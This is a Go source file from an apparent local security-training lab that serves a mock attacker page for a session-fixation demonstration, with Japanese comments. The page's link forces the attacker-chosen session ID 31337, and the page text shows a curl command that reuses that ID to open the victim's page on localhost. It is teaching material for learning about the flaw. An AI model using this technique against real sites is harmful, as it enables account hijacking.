package main

import "net/http"

// このファイルはセッションIDの固定化(Session Fixation)の「攻撃者のサイト」を模したもの。
// 攻撃者が事前に決めたセッションID(ここでは 31337)入りのリンクを、被害者に踏ませる。
// 被害者がそのリンク先でログインすると、攻撃者は同じ sid でなりすませる。

const trapSessionHTML = `<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><title>キャンペーンのお知らせ - vuln-lab</title></head>
<body style="font-family: sans-serif; margin: 0">
<div style="background:#b00020;color:#fff;padding:8px 16px;font-weight:bold">⚠️ 攻撃者サイトを模した罠ページです(ローカル学習専用)</div>
<div style="padding:16px">
<h2>会員限定キャンペーン実施中</h2>
<p><a href="http://127.0.0.1:8080/session/login?sid=31337">こちらからログインして参加</a></p>
<hr>
<p>(攻撃者の視点)上のリンクは、攻撃者が決めたセッションID <code>31337</code> を被害者に押し付けます。被害者がこのリンクからログインしたあと、攻撃者が <code>curl -b sid=31337 http://127.0.0.1:8080/session/home</code> を実行すると、被害者としてマイページが開けます。</p>
<p><a style="display:inline-block;padding:6px 12px;margin:4px 8px 4px 0;background:#444;color:#fff;text-decoration:none;border-radius:4px" href="http://127.0.0.1:8080/session/home" target="_blank" rel="noopener">被害者のマイページを開く</a></p>
</div>
</body></html>`

// registerSessionTrapRoutes はセッション固定化の罠ページを登録する。
func registerSessionTrapRoutes(mux *http.ServeMux) {
	mux.Handle("GET /session/{$}", trapPage(withNote(trapSessionHTML,
		"下のリンクは、標的アプリの /session/login に、攻撃者が決めたセッションID(sid=31337)を渡します。標的アプリはそのIDを採用し、被害者がログインしてもIDを発行し直さないため、攻撃者は同じ sid でなりすませます。")))
}
